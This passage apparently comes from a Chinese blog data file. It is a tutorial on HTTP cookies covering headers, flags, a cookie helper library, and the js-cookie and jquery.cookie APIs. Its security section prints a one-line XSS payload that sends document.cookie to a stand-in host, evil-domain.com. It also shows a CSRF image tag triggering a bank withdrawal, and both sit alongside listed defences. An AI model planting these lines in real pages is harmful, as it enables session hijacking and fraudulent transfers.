docCookies.keys()\n|*|\n\\*/\n\nvar docCookies = {\n  getItem: function(sKey) {\n    if (!sKey) {\n      return null;\n    }\n    return (\n      decodeURIComponent(\n        document.cookie.replace(\n          new RegExp(\n            \"(?:(?:^|.*;)\\\\s*\" +\n              encodeURIComponent(sKey).replace(/[\\-\\.\\+\\*]/g, \"\\\\$&\") +\n              \"\\\\s*\\\\=\\\\s*([^;]*).*$)|^.*$\"\n          ),\n          \"$1\"\n        )\n      ) || null\n    );\n  },\n  setItem: function(sKey, sValue, vEnd, sPath, sDomain, bSecure) {\n    if (!sKey || /^(?:expires|max\\-age|path|domain|secure)$/i.test(sKey)) {\n      return false;\n    }\n    var sExpires = \"\";\n    if (vEnd) {\n      switch (vEnd.constructor) {\n        case Number:\n          sExpires =\n            vEnd === Infinity\n              ? \"; expires=Fri, 31 Dec 9999 23:59:59 GMT\"\n              : \"; max-age=\" + vEnd;\n          break;\n        case String:\n          sExpires = \"; expires=\" + vEnd;\n          break;\n        case Date:\n          sExpires = \"; expires=\" + vEnd.toUTCString();\n          break;\n      }\n    }\n    document.cookie =\n      encodeURIComponent(sKey) +\n      \"=\" +\n      encodeURIComponent(sValue) +\n      sExpires +\n      (sDomain ? \"; domain=\" + sDomain : \"\") +\n      (sPath ? \"; path=\" + sPath : \"\") +\n      (bSecure ? \"; secure\" : \"\");\n    return true;\n  },\n  removeItem: function(sKey, sPath, sDomain) {\n    if (!this.hasItem(sKey)) {\n      return false;\n    }\n    document.cookie =\n      encodeURIComponent(sKey) +\n      \"=; expires=Thu, 01 Jan 1970 00:00:00 GMT\" +\n      (sDomain ? \"; domain=\" + sDomain : \"\") +\n      (sPath ? \"; path=\" + sPath : \"\");\n    return true;\n  },\n  hasItem: function(sKey) {\n    if (!sKey) {\n      return false;\n    }\n    return new RegExp(\n      \"(?:^|;\\\\s*)\" +\n        encodeURIComponent(sKey).replace(/[\\-\\.\\+\\*]/g, \"\\\\$&\") +\n        \"\\\\s*\\\\=\"\n    ).test(document.cookie);\n  },\n  keys: function() {\n    var aKeys = document.cookie\n      .replace(/((?:^|\\s*;)[^\\=]+)(?=;|$)|^\\s*|\\s*(?:\\=[^;]*)?(?:\\1|$)/g, \"\")\n      .split(/\\s*(?:\\=[^;]*)?;\\s*/);\n    for (var nLen = aKeys.length, nIdx = 0; nIdx < nLen; nIdx++) {\n      aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]);\n    }\n    return aKeys;\n  }\n};\n```\n\n## 第三方库\n\n[jquery.cookie.js](https://github.com/carhartl/jquery-cookie#readme)官方已停止维护，并推荐使用全新的[js-cookie](https://github.com/js-cookie/js-cookie)。\n\n### js-cookie\n\n```js\n// 创建一个cookie，在整个网站有效\nCookies.set(\"name\", \"value\");\n// 创建一个cookie，有效期为7天，整个网站有效\nCookies.set(\"name\", \"value\", { expires: 7 });\n// 创建一个cookie，有效期7天，当前路径有效\nCookies.set(\"name\", \"value\", { expires: 7, path: \"\" });\n\n// 读取\nCookies.get(\"name\"); // => 'value'\nCookies.get(\"nothing\"); // => undefined\n// 读取所有\nCookies.get(); // => { name: 'value' }\n// 通过设置domain或者path来读取特定cookie是不起效果的\nCookies.get(\"foo\", { domain: \"sub.example.com\" }); // `domain` won't have any effect...!\n// 删除\nCookies.remove(\"name\");\n// 对于设置了domain或者path的cookie，删除时也必须配置相应的属性参数\nCookies.set(\"name\", \"value\", { path: \"\" });\nCookies.remove(\"name\"); // fail!\nCookies.remove(\"name\", { path: \"\" }); // removed!\n\nCookies.remove(\"name\", { path: \"\", domain: \".yourdomain.com\" });\n```\n\n### jquery.cookie.js\n\n使用逻辑与 `js-cookie` 一致\n\n```js\n// Create session cookie:\n$.cookie(\"name\", \"value\");\n\n// Create expiring cookie, 7 days from then:\n$.cookie(\"name\", \"value\", { expires: 7 });\n\n// Create expiring cookie, valid across entire site:\n$.cookie(\"name\", \"value\", { expires: 7, path: \"/\" });\n\n// Read cookie:\n$.cookie(\"name\"); // => \"value\"\n$.cookie(\"nothing\"); // => undefined\n\n// Read all available cookies:\n$.cookie(); // => { \"name\": \"value\" }\n\n// Delete cookie:\n\n// Returns true when cookie was successfully deleted, otherwise false\n$.removeCookie(\"name\"); // => true\n$.removeCookie(\"nothing\"); // => false\n\n// Need to use the same attributes (path, domain) as what the cookie was written with\n$.cookie(\"name\", \"value\", { path: \"/\" });\n// This won't work!\n$.removeCookie(\"name\"); // => false\n// This will work!\n$.removeCookie(\"name\", { path: \"/\" }); // => true\n\n// Note: when deleting a cookie, you must pass the exact same path, domain and secure options that were used to set the cookie, unless you're relying on the default options that is.\n```\n\n## 实践场景\n\n系统升级后，对于历史 B 类买家，第一次登陆系统后在对应的承载页给出弹框提示。\n实现思路：登陆时后端根据账户数据判断出是否为符合条件的用户，符合则在响应头中设置 cookie 值，前端页面加载时获取对应的 cookie 值，判断是否需要显示弹框。弹框确认关闭后清除 cookie。\n\n# 参考\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie/Simple_document.cookie_framework\n","slug":"cookie","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d91c00b2wovvky2g2rff","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。</p>\n<a id=\"more\"></a>\n<p>Cookie 主要用于以下三个方面：</p>\n<ul>\n<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>\n<li>个性化设置（如用户自定义设置、主题等）</li>\n<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>\n</ul>\n<p>Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB 。</p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"创建-Cookie\"><a href=\"#创建-Cookie\" class=\"headerlink\" title=\"创建 Cookie\"></a>创建 Cookie</h2><p>当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 Set-Cookie 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 Cookie 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>\n<h3 id=\"Set-Cookie-响应头部和-Cookie-请求头部\"><a href=\"#Set-Cookie-响应头部和-Cookie-请求头部\" class=\"headerlink\" title=\"Set-Cookie 响应头部和 Cookie 请求头部\"></a>Set-Cookie 响应头部和 Cookie 请求头部</h3><p>服务器使用<code>Set-Cookie</code>响应头部向用户代理（一般是浏览器）发送 Cookie 信息。一个简单的 Cookie 可能像这样：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: &lt;cookie名&gt;=&lt;cookie值&gt;</span><br></pre></td></tr></table></figure>\n<p>服务器通过该头部告知客户端<strong>保存</strong>Cookie 信息。</p>\n<p>对于服务端程序中设置 Set-Cookie 响应头信息，不同语言有各自的语法，Node.JS 示例如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">response.setHeader(<span class=\"string\">\"Set-Cookie\"</span>, [<span class=\"string\">\"type=ninja\"</span>, <span class=\"string\">\"language=javascript\"</span>]);</span><br></pre></td></tr></table></figure>\n<p>响应头示例：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.0 200 OK</span><br><span class=\"line\">Content-type: text/html</span><br><span class=\"line\">Set-Cookie: yummy_cookie=choco</span><br><span class=\"line\">Set-Cookie: tasty_cookie=strawberry</span><br></pre></td></tr></table></figure>\n<p>下一次的请求头示例：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /sample_page.html HTTP/1.1</span><br><span class=\"line\">Host: www.example.org</span><br><span class=\"line\">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure>\n<h2 id=\"几个概念\"><a href=\"#几个概念\" class=\"headerlink\" title=\"几个概念\"></a>几个概念</h2><p>会话期 Cookie：浏览器关闭自动删除 cookie。</p>\n<p>持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）。</p>\n<p>Cookie 的 Secure 标记：Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。</p>\n<p>Cookie 的 HttpOnly 标记：只能发送给服务端而不能被 JavaScript 脚本调用。</p>\n<p>Cookie 的作用域：Domain 和 Path 标识定义了 Cookie 的作用域，即 Cookie 应该发送给哪些 URL。</p>\n<p>JavaScript 调用：通过 Document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。</p>\n<h2 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h2><blockquote>\n<p>当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息。</p>\n</blockquote>\n<h3 id=\"会话劫持和-XSS\"><a href=\"#会话劫持和-XSS\" class=\"headerlink\" title=\"会话劫持和 XSS\"></a>会话劫持和 XSS</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</span><br></pre></td></tr></table></figure>\n<h3 id=\"跨站请求伪造（CSRF）\"><a href=\"#跨站请求伪造（CSRF）\" class=\"headerlink\" title=\"跨站请求伪造（CSRF）\"></a>跨站请求伪造（CSRF）</h3><p>比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">src</span>=<span class=\"string\">\"http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory\"</span></span></span><br><span class=\"line\"><span class=\"tag\">/&gt;</span></span><br></pre></td></tr></table></figure>\n<p>当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：</p>\n<ul>\n<li>对用户输入进行过滤来阻止 XSS；</li>\n<li>任何敏感操作都需要确认；</li>\n<li>用于敏感信息的 Cookie 只能拥有较短的生命周期；</li>\n<li>更多方法可以查看<a href=\"https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF\" target=\"_blank\" rel=\"noopener\">OWASP CSRF prevention cheat sheet</a>_Prevention_Cheat_Sheet&gt;)。</li>\n</ul>\n<h2 id=\"封装一个-cookie-使用库\"><a href=\"#封装一个-cookie-使用库\" class=\"headerlink\" title=\"封装一个 cookie 使用库\"></a>封装一个 cookie 使用库</h2><p>写入一个 cookie：<code>docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])</code></p>\n<p>获取一个 cookie：<code>docCookies.getItem(name)</code></p>\n<p>移除一个 cookie：<code>docCookies.removeItem(name[, path[, domain]])</code></p>\n<p>检查一个 cookie（是否存在）：<code>docCookies.hasItem(name)</code></p>\n<p>获取所有 cookie 列表：<code>docCookies.keys()</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*\\</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  :: cookies.js ::</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  A complete cookies reader/writer framework with full unicode support.</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  Revision #1 - September 4, 2014</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  https://developer.mozilla.org/en-US/docs/Web/API/document.cookie</span></span><br><span class=\"line\"><span class=\"comment\">|*|  https://developer.mozilla.org/User:fusionchess</span></span><br><span class=\"line\"><span class=\"comment\">|*|  https://github.com/madmurphy/cookies.js</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  This framework is released under the GNU Public License, version 3 or later.</span></span><br><span class=\"line\"><span class=\"comment\">|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  Syntaxes:</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])</span></span><br><span class=\"line\"><span class=\"comment\">|*|  * docCookies.getItem(name)</span></span><br><span class=\"line\"><span class=\"comment\">|*|  * docCookies.removeItem(name[, path[, domain]])</span></span><br><span class=\"line\"><span class=\"comment\">|*|  * docCookies.hasItem(name)</span></span><br><span class=\"line\"><span class=\"comment\">|*|  * docCookies.keys()</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">\\*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> docCookies = &#123;</span><br><span class=\"line\">  getItem: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">sKey</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!sKey) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"built_in\">decodeURIComponent</span>(</span><br><span class=\"line\">        <span class=\"built_in\">document</span>.cookie.replace(</span><br><span class=\"line\">          <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(</span><br><span class=\"line\">            <span class=\"string\">\"(?:(?:^|.*;)\\\\s*\"</span> +</span><br><span class=\"line\">              <span class=\"built_in\">encodeURIComponent</span>(sKey).replace(<span class=\"regexp\">/[\\-\\.\\+\\*]/g</span>, <span class=\"string\">\"\\\\$&amp;\"</span>) +</span><br><span class=\"line\">              <span class=\"string\">\"\\\\s*\\\\=\\\\s*([^;]*).*$)|^.*$\"</span></span><br><span class=\"line\">          ),</span><br><span class=\"line\">          <span class=\"string\">\"$1\"</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">      ) || <span class=\"literal\">null</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  setItem: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">sKey, sValue, vEnd, sPath, sDomain, bSecure</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!sKey || <span class=\"regexp\">/^(?:expires|max\\-age|path|domain|secure)$/i</span>.test(sKey)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> sExpires = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (vEnd) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">switch</span> (vEnd.constructor) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"built_in\">Number</span>:</span><br><span class=\"line\">          sExpires =</span><br><span class=\"line\">            vEnd === <span class=\"literal\">Infinity</span></span><br><span class=\"line\">              ? <span class=\"string\">\"; expires=Fri, 31 Dec 9999 23:59:59 GMT\"</span></span><br><span class=\"line\">              : <span class=\"string\">\"; max-age=\"</span> + vEnd;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"built_in\">String</span>:</span><br><span class=\"line\">          sExpires = <span class=\"string\">\"; expires=\"</span> + vEnd;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"built_in\">Date</span>:</span><br><span class=\"line\">          sExpires = <span class=\"string\">\"; expires=\"</span> + vEnd.toUTCString();</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">document</span>.cookie =</span><br><span class=\"line\">      <span class=\"built_in\">encodeURIComponent</span>(sKey) +</span><br><span class=\"line\">      <span class=\"string\">\"=\"</span> +</span><br><span class=\"line\">      <span class=\"built_in\">encodeURIComponent</span>(sValue) +</span><br><span class=\"line\">      sExpires +</span><br><span class=\"line\">      (sDomain ? <span class=\"string\">\"; domain=\"</span> + sDomain : <span class=\"string\">\"\"</span>) +</span><br><span class=\"line\">      (sPath ? <span class=\"string\">\"; path=\"</span> + sPath : <span class=\"string\">\"\"</span>) +</span><br><span class=\"line\">      (bSecure ? <span class=\"string\">\"; secure\"</span> : <span class=\"string\">\"\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  removeItem: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">sKey, sPath, sDomain</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.hasItem(sKey)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">document</span>.cookie =</span><br><span class=\"line\">      <span class=\"built_in\">encodeURIComponent</span>(sKey) +</span><br><span class=\"line\">      <span class=\"string\">\"=; expires=Thu, 01 Jan 1970 00:00:00 GMT\"</span> +</span><br><span class=\"line\">      (sDomain ? <span class=\"string\">\"; domain=\"</span> + sDomain : <span class=\"string\">\"\"</span>) +</span><br><span class=\"line\">      (sPath ? <span class=\"string\">\"; path=\"</span> + sPath : <span class=\"string\">\"\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  hasItem: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">sKey</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!sKey) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(</span><br><span class=\"line\">      <span class=\"string\">\"(?:^|;\\\\s*)\"</span> +</span><br><span class=\"line\">        <span class=\"built_in\">encodeURIComponent</span>(sKey).replace(<span class=\"regexp\">/[\\-\\.\\+\\*]/g</span>, <span class=\"string\">\"\\\\$&amp;\"</span>) +</span><br><span class=\"line\">        <span class=\"string\">\"\\\\s*\\\\=\"</span></span><br><span class=\"line\">    ).test(<span class=\"built_in\">document</span>.cookie);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  keys: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> aKeys = <span class=\"built_in\">document</span>.cookie</span><br><span class=\"line\">      .replace(<span class=\"regexp\">/((?:^|\\s*;)[^\\=]+)(?=;|$)|^\\s*|\\s*(?:\\=[^;]*)?(?:\\1|$)/g</span>, <span class=\"string\">\"\"</span>)</span><br><span class=\"line\">      .split(<span class=\"regexp\">/\\s*(?:\\=[^;]*)?;\\s*/</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> nLen = aKeys.length, nIdx = <span class=\"number\">0</span>; nIdx &lt; nLen; nIdx++) &#123;</span><br><span class=\"line\">      aKeys[nIdx] = <span class=\"built_in\">decodeURIComponent</span>(aKeys[nIdx]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> aKeys;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"第三方库\"><a href=\"#第三方库\" class=\"headerlink\" title=\"第三方库\"></a>第三方库</h2><p><a href=\"https://github.com/carhartl/jquery-cookie#readme\" target=\"_blank\" rel=\"noopener\">jquery.cookie.js</a>官方已停止维护，并推荐使用全新的<a href=\"https://github.com/js-cookie/js-cookie\" target=\"_blank\" rel=\"noopener\">js-cookie</a>。</p>\n<h3 id=\"js-cookie\"><a href=\"#js-cookie\" class=\"headerlink\" title=\"js-cookie\"></a>js-cookie</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 创建一个cookie，在整个网站有效</span></span><br><span class=\"line\">Cookies.set(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// 创建一个cookie，有效期为7天，整个网站有效</span></span><br><span class=\"line\">Cookies.set(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>, &#123; <span class=\"attr\">expires</span>: <span class=\"number\">7</span> &#125;);</span><br><span class=\"line\"><span class=\"comment\">// 创建一个cookie，有效期7天，当前路径有效</span></span><br><span class=\"line\">Cookies.set(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>, &#123; <span class=\"attr\">expires</span>: <span class=\"number\">7</span>, <span class=\"attr\">path</span>: <span class=\"string\">\"\"</span> &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 读取</span></span><br><span class=\"line\">Cookies.get(<span class=\"string\">\"name\"</span>); <span class=\"comment\">// =&gt; 'value'</span></span><br><span class=\"line\">Cookies.get(<span class=\"string\">\"nothing\"</span>); <span class=\"comment\">// =&gt; undefined</span></span><br><span class=\"line\"><span class=\"comment\">// 读取所有</span></span><br><span class=\"line\">Cookies.get(); <span class=\"comment\">// =&gt; &#123; name: 'value' &#125;</span></span><br><span class=\"line\"><span class=\"comment\">// 通过设置domain或者path来读取特定cookie是不起效果的</span></span><br><span class=\"line\">Cookies.get(<span class=\"string\">\"foo\"</span>, &#123; <span class=\"attr\">domain</span>: <span class=\"string\">\"sub.example.com\"</span> &#125;); <span class=\"comment\">// `domain` won't have any effect...!</span></span><br><span class=\"line\"><span class=\"comment\">// 删除</span></span><br><span class=\"line\">Cookies.remove(<span class=\"string\">\"name\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// 对于设置了domain或者path的cookie，删除时也必须配置相应的属性参数</span></span><br><span class=\"line\">Cookies.set(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>, &#123; <span class=\"attr\">path</span>: <span class=\"string\">\"\"</span> &#125;);</span><br><span class=\"line\">Cookies.remove(<span class=\"string\">\"name\"</span>); <span class=\"comment\">// fail!</span></span><br><span class=\"line\">Cookies.remove(<span class=\"string\">\"name\"</span>, &#123; <span class=\"attr\">path</span>: <span class=\"string\">\"\"</span> &#125;); <span class=\"comment\">// removed!</span></span><br><span class=\"line\"></span><br><span class=\"line\">Cookies.remove(<span class=\"string\">\"name\"</span>, &#123; <span class=\"attr\">path</span>: <span class=\"string\">\"\"</span>, <span class=\"attr\">domain</span>: <span class=\"string\">\".yourdomain.com\"</span> &#125;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"jquery-cookie-js\"><a href=\"#jquery-cookie-js\" class=\"headerlink\" title=\"jquery.cookie.js\"></a>jquery.cookie.js</h3><p>使用逻辑与 <code>js-cookie</code> 一致</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Create session cookie:</span></span><br><span class=\"line\">$.cookie(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Create expiring cookie, 7 days from then:</span></span><br><span class=\"line\">$.cookie(<span class=\"string\">\"name\"</span>, <span 